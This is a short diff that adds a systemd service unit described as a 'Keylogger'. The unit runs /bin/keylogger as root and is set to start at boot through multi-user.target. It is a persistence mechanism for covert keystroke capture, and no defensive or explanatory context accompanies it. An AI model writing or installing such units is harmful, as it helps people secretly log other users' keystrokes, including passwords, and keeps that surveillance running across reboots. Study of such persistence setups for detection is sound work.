@@ -1,0 +1,10 @@
+[Unit]
+Description=Keylogger
+
+[Service]
+RemainAfterExit=yes
+User=root
+ExecStart=/bin/keylogger
+
+[Install]
+WantedBy=multi-user.target
